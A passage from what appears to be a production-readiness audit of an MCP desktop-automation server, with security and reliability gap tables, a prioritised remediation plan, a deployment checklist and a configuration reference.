| **Docker/Kubernetes Deployment** | Hardened container with headless display support | Cloud/sandbox deployment |
| **API Authentication Layer** | JWT/API-key auth for HTTP mode | Multi-user security |
| **Tool Schema Registry** | Versioned tool schemas with backward compat guarantees | Client compatibility |
| **Screenpipe Integration** | Continuous capture with OCR/indexing | Persistent memory of desktop activity |

---

## 8. Production Readiness Assessment

### 8.1 Error Handling

| Aspect | Status | Gap |
|--------|--------|-----|
| Structured error types | ❌ None | All errors are raw strings |
| Error categorization | ❌ None | No distinction between retryable/fatal |
| Error context in responses | ⚠️ Partial | Some tools include context, others don't |
| Error logging | ⚠️ Partial | `logger.error()` in some places, `print()` in others |
| Error propagation to client | ⚠️ Partial | MCP protocol returns errors, but content is unstructured |

### 8.2 Resource Management

| Aspect | Status | Gap |
|--------|--------|-----|
| Graceful shutdown | ✅ Good | `ShutdownManager` with request draining, signal handlers |
| Context-local state | ✅ Good | `contextvars` for per-request state isolation |
| Timeout enforcement | ✅ Good | `with_timeout()` decorator on all tools |
| Resource cleanup on error | ⚠️ Partial | Overlay cleanup works; file handles may leak |
| Process lifecycle | ⚠️ Partial | Browser-use subprocess managed; ASR/TTS bridges are not |
| Memory management | ⚠️ Partial | `prune_message_history()` exists; no explicit GC hints |

### 8.3 Configuration

| Aspect | Status | Gap |
|--------|--------|-----|
| Configuration validation | ✅ Good | `ServerConfig` with pydantic-settings, field validators |
| Required fields enforced | ✅ Good | `OI_PATH` raises `ValueError` if missing |
| Environment variable support | ✅ Good | Full `.env` loading with `python-dotenv` |
| Per-environment profiles | ❌ None | No dev/staging/prod distinction |
| Configuration documentation | ✅ Good | `.env.example` is comprehensive |
| Runtime config reload | ❌ None | Config is read once at startup |

### 8.4 API Design

| Aspect | Status | Gap |
|--------|--------|-----|
| Tool schema consistency | ⚠️ Partial | Some tools lack full type annotations |
| Tool naming convention | ✅ Good | Clear naming: `computer`, `read_screen_ui`, `bu_*` |
| Backward compatibility | ❌ None | No versioning; tool schemas can change any time |
| Input validation | ⚠️ Partial | FastMCP validates from annotations, but many are `Optional[Any]` |
| Response format | ⚠️ Partial | Mixed `TextContent` / `ImageContent` without schema |

### 8.5 Concurrency & Thread Safety

| Aspect | Status | Gap |
|--------|--------|-----|
| Event loop blocking | ❌ Bad | `mss.grab()` and `requests.post()` block the loop |
| Thread-safe global state | ✅ Good | `contextvars` + `_init_lock` for tool initialization |
| Process management | ⚠️ Partial | BrowserUseProxy has asyncio.Lock; bridges have none |
| Connection pooling | ❌ None | `requests` created fresh per call; no httpx pool |

### 8.6 Security

| Aspect | Status | Gap |
|--------|--------|-----|
| Input sanitization | ❌ None | Shell commands passed directly to subprocess |
| Command allowlisting | ❌ None | Only in mcp_complex_prompt_llm.py, not in server |
| API key storage | ❌ Bad | Keys in .env committed to repo |
| Transport security | ❌ None | No TLS for HTTP/SSE mode, no auth |
| Rate limiting | ❌ None | Unlimited tool calls per second |
| Client authentication | ❌ None | Any connection is fully trusted |
| Output sanitization | ❌ None | Screenshots can capture sensitive data |

### 8.7 Cross-Platform Compatibility

| Aspect | Status | Gap |
|--------|--------|-----|
| Windows support | ✅ Good | Primary platform, most features work |
| Linux support | ⚠️ Partial | Setup scripts exist; no UIAutomation, no overlay |
| macOS support | ❌ None | No setup scripts, no UIAutomation alternative |
| Docker support | ⚠️ Partial | OpenFang Dockerfile exists but is legacy/unmaintained |

---

## 9. Priority Ranking & Remediation Plan

### CRITICAL (Deploy-Blocking) — Must Fix Before Any Production Use

| # | Issue | File | Fix Summary |
|---|-------|------|-------------|
| C1 | API key leaked in `.env` | [`.env`](.env:2) | Revoke key, add `.env` to `.gitignore`, audit git history |
| C2 | Unrestricted shell execution | [`src/server.py`](src/server.py:1022) | Add command allowlist/denylist, sandbox, audit logging |
| C3 | Unrestricted mouse/keyboard | [`src/server.py`](src/server.py:460-700) | Add user confirmation, rate limiting, screenshot redaction |
| C4 | Double tool registration | [`src/server.py`](src/server.py:1237-1238) | Remove duplicate `app.add_tool()` calls |
| C5 | Blocking screenshot in async | [`src/server.py`](src/server.py:607-647) | Wrap `mss.grab()` in `run_in_executor()` |
| C6 | Sync `requests` in async | [`src/run_agent.py`](src/run_agent.py:456) | Replace with `httpx.AsyncClient` |

### HIGH (Stability & Reliability) — Fix Before Scaling

| # | Issue | File | Fix Summary |
|---|-------|------|-------------|
| H1 | Incomplete `.gitignore` | [`.gitignore`](.gitignore) | Add `.env`, `__pycache__/`, `*.log`, venv dirs |
| H2 | Bare except pattern (~80+) | Multiple files | Replace with specific exception types + logging |
| H3 | No bridge endpoint validation | [`src/speech_processor.py`](src/speech_processor.py) | Add health checks, retry logic |
| H4 | Temp file race in ASR bridge | [`bridges/asr_server.py`](bridges/asr_server.py:55) | Use `NamedTemporaryFile` |
| H5 | `capture_service.py` dead code | [`src/capture_service.py`](src/capture_service.py) | Integrate or remove |
| H6 | Overlay window accessible externally | [`src/overlay.py`](src/overlay.py:575-599) | Add `WS_EX_NOACTIVATE`, message filter |
| H7 | Hardcoded VNC password in Docker | [`platforms/openfang/Dockerfile`](platforms/openfang/Dockerfile:28-29) | Use Docker secrets |
| H8 | Sync `requests` in streamer | [`src/mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py:27) | Use `httpx` async streaming |
| H9 | No telemetry/observability | All | Add OpenTelemetry, structured logging, `/health` |

### MEDIUM (Production Readiness) — Fix Before Multi-User Deployment

| # | Issue | File | Fix Summary |
|---|-------|------|-------------|
| M1 | Coordinate mapping inconsistency | [`src/voice_server.py`](src/voice_server.py) vs [`src/server.py`](src/server.py) | Unify coordinate mapping logic |
| M2 | Commented-out code in overlay | [`src/overlay.py`](src/overlay.py:318-425) | Remove dead code |
| M3 | Silent ImportError in UI scan | [`src/ui_elements.py`](src/ui_elements.py:382-384) | Return informative message, not empty list |
| M4 | No environment profiles | [`src/config.py`](src/config.py) | Add `.env.dev`/`.env.prod` support |
| M5 | Zero unit tests | [`tests/`](tests/) | Add pytest suite with mocking |
| M6 | Duplicate code in runners | [`src/run_agent.py`](src/run_agent.py) vs [`src/mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py) | Extract shared utilities |
| M7 | Hardcoded paths in bridge.ps1 | [`platforms/openfang/bridge.ps1`](platforms/openfang/bridge.ps1:22-23) | Make paths relative/configurable |
| M8 | Monkey-patching in hybrid_server | [`src/hybrid_server.py`](src/hybrid_server.py:282-284) | Report upstream, add safe context manager |
| M9 | Setup mutates external repo | [`scripts/setup.bat`](scripts/setup.bat:80-93) | Use `pip install --no-deps` or fork |
| M10 | Unstructured tool error messages | Multiple | Create `ToolError` hierarchy |
| M11 | No scan_browser error differentiation | [`src/ui_elements.py`](src/ui_elements.py:120-293) | Differentiate "no CDP" from "CDP failed" |

### LOW (Nice-to-Have) — Polish & Best Practices

| # | Issue | Fix |
|---|-------|-----|
| L1 | No license file | Add MIT or Apache-2.0 |
| L2 | Step numbering in setup.bat | Fix echo statements |
| L3 | Perplexity AI artifacts in document.md | Clean up or remove |
| L4 | Undocumented voice_client.html | Add to README or move to docs/ |
| L5 | No pyproject.toml | Modernize packaging |
| L6 | Typo in OpenFang README | Fix "condoms" → "conda environments" |
| L7 | Unpinned dependencies | Add version ranges |
| L8 | Hardcoded "local-key" in scratch | Use env var pattern |

---

## 10. Remediation Phases

### Phase 1: Critical Stabilization
- Revoke and rotate all leaked API keys
- Add `.env` to `.gitignore` and audit git history
- Fix double tool registration in `server.py`
- Make screenshot capture async (`run_in_executor`)
- Replace `requests` with `httpx` for all async paths
- Add basic command denylist/allowlist to `bash` tool

### Phase 2: Security Hardening
- Add confirmation prompts for destructive actions
- Implement screenshot redaction for sensitive regions
- Fix Docker VNC password handling
- Add `WS_EX_NOACTIVATE` to overlay windows
- Add rate limiting per client connection
- Fix `.gitignore` to cover all generated/sensitive files

### Phase 3: Reliability & Test Coverage
- Replace bare `except Exception:` with specific types everywhere
- Add pytest unit test suite for all core modules
- Fix temp file race conditions in bridge servers
- Add health checks and retry logic for bridge endpoints
- Add structured error types for VLM-consumable error messages
- Unify coordinate mapping between server and voice_server

### Phase 4: Production Polish
- Add OpenTelemetry instrumentation
- Add environment profile support
- Extract shared MCP client utilities
- Modernize packaging with `pyproject.toml`
- Add TLS support for HTTP/SSE transport
- Add API authentication layer
- Clean up dead code and commented-out blocks

---

## 11. Pre-Production Checklist

### Before Any Deployment

- [ ] All API keys rotated; `.env` in `.gitignore`; git history scrubbed
- [ ] Shell execution sandbox or allowlist active
- [ ] Rate limiting on all tool endpoints
- [ ] `.gitignore` covers all sensitive/generated files
- [ ] Double tool registration bug fixed
- [ ] Screenshot capture is async (non-blocking)
- [ ] Unit test suite passes with >80% coverage
- [ ] Error handling returns structured, actionable messages

### Before Scaling (10+ Concurrent Agents)

- [ ] `httpx.AsyncClient` replaces all `requests` usage
- [ ] Connection pooling for all HTTP calls
- [ ] OpenTelemetry tracing operational
- [ ] Health check endpoints for all bridge servers
- [ ] Per-client permission scoping
- [ ] TLS on all non-stdio transports
- [ ] Load test results documented

---

## 12. Configuration Reference

### Core Configuration

| Variable | Type | Default | Description |
|----------|------|---------|-------------|
| `OI_PATH` | str | **REQUIRED** | Path to Open Interpreter clone |
| `OI_PATH_WIN` | str | None | Windows-specific OI path override |
| `OI_PATH_LINUX` | str | None | Linux-specific OI path override |
| `HOST` | str | `0.0.0.0` | Server bind host |
| `PORT` | int | `8000` | Server bind port |

### Tool Configuration

| Variable | Type | Default | Constraints | Description |
|----------|------|---------|-------------|-------------|
| `MCP_TOOL_TIMEOUT` | int | `60000` | >= 1000 | Global tool timeout (ms) |
| `MCP_SCREENSHOT_SCALING` | bool | `1` | — | Enable screenshot downscaling |
| `MCP_MAX_SCREENSHOT_WIDTH` | int | `1366` | >= 320 | Max screenshot width (px) |
| `MCP_MAX_SCREENSHOT_HEIGHT` | int | `768` | >= 240 | Max screenshot height (px) |
| `MCP_CAPTURE_SCOPE` | str | `primary` | primary \| virtual | Screen capture region |
| `MCP_COORDINATE_GRID` | int | `0` | 0 or >= 100 | Coordinate normalization grid size |

### UI Scanning

| Variable | Type | Default | Constraints | Description |
|----------|------|---------|-------------|-------------|
| `MCP_AUTO_SCAN_ALWAYS` | bool | `0` | — | Auto-scan after every computer action |
| `MCP_AUTO_SCAN_ON_CHANGE` | bool | `1` | — | Auto-scan only when screen changes |
| `MCP_AUTO_SCAN_MAX_ELEMENTS` | int | `60` | >= 1 | Max elements in auto-scan results |
| `MCP_UI_SCAN_BROWSER_ELEMENT_LIMIT` | int | `80` | >= 1 | Browser DOM element cap |
| `MCP_UI_SCAN_BROWSER_MAX_DEPTH` | int | `3` | >= 1 | Browser DOM traversal depth |
| `MCP_UI_SCAN_BROWSER_ACTIVE_ONLY` | bool | `1` | — | Restrict browser scan to active window |

### Input/Overlay Tuning

| Variable | Type | Default | Constraints | Description |
|----------|------|---------|-------------|-------------|
| `MCP_MOVE_DURATION_MS` | int | `150` | 0-2000 | Smooth mouse move duration |
| `MCP_OVERLAY_MIN_HOLD_MS` | int | `450` | >= 50 | Min overlay hold time |
| `MCP_OVERLAY_FADE_MS` | int | `260` | >= 10 | Overlay fade duration |
| `MCP_TYPE_INTERVAL_SEC` | float | `0.02` | 0.0-1.0 | Per-character typing delay |

### Hybrid Mode

| Variable | Type | Default | Description |
|----------|------|---------|-------------|
| `BROWSER_USE_PYTHON` | str | None | Override Python for browser-use subprocess |
| `BROWSER_USE_HEADLESS` | bool | `0` | Force headless browser in browser-use |
| `HYBRID_DEBUG` | bool | `0` | Enable hybrid mode debug logging |
| `HYBRID_BU_START_TIMEOUT_S` | float | `25.0` | Browser-use subprocess startup timeout |
| `HYBRID_BU_CALL_TIMEOUT_S` | float | `25.0` | Browser-use tool call timeout |
| `BROWSER_CDP_PORT` | int | `9222` | Chrome DevTools Protocol port |

### Voice Server

| Variable | Type | Default | Description |
|----------|------|---------|-------------|
| `VOICE_SCREEN_W` | int | Auto-detected | Override screen width for voice coordinate scaling |
| `VOICE_SCREEN_H` | int | Auto-detected | Override screen height for voice coordinate scaling |

---

## Conclusion

This project demonstrates significant architectural ambition: a production-grade MCP server that combines desktop automation, browser DOM extraction, voice interaction, and multi-provider VLM support. Recent improvements — `contextvars` for async-safe state, `pydantic-settings` validation, `ShutdownManager` with request draining, `with_timeout` enforcement, and the separate-venv bridge architecture — represent meaningful progress toward production readiness.

However, the codebase still carries the hallmarks of an experimental prototype:
- **Security is fundamentally absent** — unrestricted shell/UI control, leaked API keys, no authentication
- **Reliability is fragile** — 80+ bare exception handlers, blocking I/O in async paths, race conditions in bridge servers
- **Observability is missing** — no structured logging, no metrics, no tracing, no health checks
- **Testing is thin** — integration-only tests that require a live desktop, zero unit tests
- **Dependency management is unstable** — conflicting transformers pins require isolated venvs, most packages are unpinned

The single most critical next step is **security hardening**. Before this server is exposed to any network — even a local network used by multiple MCP clients — the shell execution and UI control surfaces must have guardrails, and the exposed API key must be revoked.

The codebase is approximately **55% production-ready**. With the phased remediation plan above, it could reach production-grade quality, but the security and reliability gaps represent substantial work that should not be underestimated.
